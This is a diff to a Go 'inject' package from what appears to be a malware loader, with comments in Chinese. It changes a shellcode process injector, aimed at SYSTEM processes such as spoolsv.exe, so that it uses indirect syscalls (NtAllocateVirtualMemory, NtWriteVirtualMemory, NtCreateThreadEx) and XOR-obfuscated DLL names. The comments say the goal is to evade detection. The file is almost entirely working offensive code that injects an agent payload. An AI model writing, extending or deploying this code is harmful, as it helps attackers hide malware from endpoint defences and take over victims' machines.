@@ -4,6 +4,7 @@
 //进程注入存在问题，执行命令会导致受害者桌面崩溃，貌似是因为agent.exe太大
 //注释掉了winlogon.exe，添加了spoolsv.exe，目前测试不再崩溃
 //对敏感字符串（注入目标进程）进行了简单的异或加密处理
+//讲敏感的动态链接库名称进行了疑惑加密
 
 package inject
 
@@ -16,12 +17,9 @@ import (
 )
 
 var (
-	kernel32           = syscall.NewLazyDLL(xorDecrypt([]byte{0x1c, 0x12, 0x05, 0x19, 0x12, 0x1b, 0x44, 0x45, 0x59, 0x13, 0x1b, 0x1b}))                                   // kernel32.dll
-	ntdll              = syscall.NewLazyDLL(xorDecrypt([]byte{0x19, 0x03, 0x13, 0x1b, 0x1b, 0x59, 0x13, 0x1b, 0x1b}))                                                     // ntdll.dll
-	VirtualAllocEx     = kernel32.NewProc(xorDecrypt([]byte{0x21, 0x1e, 0x05, 0x03, 0x02, 0x16, 0x1b, 0x36, 0x1b, 0x1b, 0x18, 0x14, 0x32, 0x0f}))                         // VirtualAllocEx
-	WriteProcessMemory = kernel32.NewProc(xorDecrypt([]byte{0x20, 0x05, 0x1e, 0x03, 0x12, 0x27, 0x05, 0x18, 0x14, 0x12, 0x04, 0x04, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e})) // WriteProcessMemory
-	CreateRemoteThread = kernel32.NewProc(xorDecrypt([]byte{0x34, 0x05, 0x12, 0x16, 0x03, 0x12, 0x25, 0x12, 0x1a, 0x18, 0x03, 0x12, 0x23, 0x1f, 0x05, 0x12, 0x16, 0x13})) // CreateRemoteThread
-	RtlMoveMemory      = ntdll.NewProc(xorDecrypt([]byte{0x25, 0x03, 0x1b, 0x3a, 0x18, 0x01, 0x12, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e}))                                  // RtlMoveMemory
+	kernel32      = syscall.NewLazyDLL(xorDecrypt([]byte{0x1c, 0x12, 0x05, 0x19, 0x12, 0x1b, 0x44, 0x45, 0x59, 0x13, 0x1b, 0x1b}))  // kernel32.dll
+	ntdll         = syscall.NewLazyDLL(xorDecrypt([]byte{0x19, 0x03, 0x13, 0x1b, 0x1b, 0x59, 0x13, 0x1b, 0x1b}))                    // ntdll.dll
+	RtlMoveMemory = ntdll.NewProc(xorDecrypt([]byte{0x25, 0x03, 0x1b, 0x3a, 0x18, 0x01, 0x12, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e})) // RtlMoveMemory
 )
 
 const (
@@ -38,6 +36,11 @@ func Execute(shellcode []byte) error {
 	}
 
 	fmt.Printf("[+] 载荷已就绪: %d 字节\n", len(shellcode))
+
+	// 初始化 Syscalls
+	if err := InitSyscalls(); err != nil {
+		fmt.Printf("[-] Warning: Syscall initialization failed, evasion might be compromised: %v\n", err)
+	}
 
 	// 0. 提升进程权限，启用 SeDebugPrivilege（关键：允许注入 SYSTEM 进程）
 	if err := enableSeDebugPrivilege(); err != nil {
@@ -66,47 +69,55 @@ func Execute(shellcode []byte) error {
 	defer windows.CloseHandle(hProcess)
 	fmt.Println("[+] 目标进程已打开")
 
-	// 3. 在目标进程中申请内存
-	addr, _, err := VirtualAllocEx.Call(
+	// 3. 在目标进程中申请内存 (使用 Indirect Syscall: NtAllocateVirtualMemory)
+	var baseAddr uintptr = 0
+	var regionSize uintptr = uintptr(len(shellcode))
+
+	status := NtAllocateVirtualMemory(
 		uintptr(hProcess),
+		&baseAddr,
 		0,
-		uintptr(len(shellcode)),
+		&regionSize,
 		MEM_COMMIT|MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE,
 	)
-	if addr == 0 {
-		return fmt.Errorf("目标进程内存申请失败: %v", err)
-	}
-	fmt.Printf("[+] 目标进程内存申请成功: 0x%x\n", addr)
 
-	// 4. 写入 Shellcode 到目标进程
-	var written uintptr
-	ret, _, err := WriteProcessMemory.Call(
+	if status != 0 {
+		return fmt.Errorf("NtAllocateVirtualMemory 失败: 0x%x", status)
+	}
+	fmt.Printf("[+] 目标进程内存申请成功: 0x%x\n", baseAddr)
+
+	// 4. 写入 Shellcode 到目标进程 (使用 Indirect Syscall: NtWriteVirtualMemory)
+	var bytesWritten uintptr
+	status = NtWriteVirtualMemory(
 		uintptr(hProcess),
-		addr,
+		baseAddr,
 		uintptr(unsafe.Pointer(&shellcode[0])),
 		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&written)),
+		&bytesWritten,
 	)
-	if ret == 0 {
-		return fmt.Errorf("写入目标进程内存失败: %v", err)
+	if status != 0 {
+		return fmt.Errorf("NtWriteVirtualMemory 失败: 0x%x", status)
 	}
-	fmt.Printf("[+] Payload 已写入目标进程: %d 字节\n", written)
+	fmt.Printf("[+] Payload 已写入目标进程: %d 字节\n", bytesWritten)
 
-	// 5. 在目标进程创建远程线程执行
-	thread, _, err := CreateRemoteThread.Call(
+	// 5. 在目标进程创建远程线程执行 (使用 Indirect Syscall: NtCreateThreadEx)
+	var hThread uintptr
+	status = NtCreateThreadEx(
+		&hThread,
+		0x1FFFFF, // STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL
+		0,
 		uintptr(hProcess),
+		baseAddr,
 		0,
-		0,
-		addr,
-		0,
-		0,
-		0,
+		0, // 0 = 立即执行
+		0, 0, 0, 0,
 	)
-	if thread == 0 {
-		return fmt.Errorf("远程线程创建失败: %v", err)
+
+	if status != 0 {
+		return fmt.Errorf("NtCreateThreadEx 失败: 0x%x", status)
 	}
-	fmt.Printf("[+] 远程线程已创建，Agent 已注入到 %s\n", targetName)
+	fmt.Printf("[+] 远程线程已创建 (Handle: 0x%x)，Agent 已注入到 %s\n", hThread, targetName)
 	fmt.Println("[+] Loader 任务完成，即将退出...")
 
 	// 不等待线程执行，让 Loader 直接退出
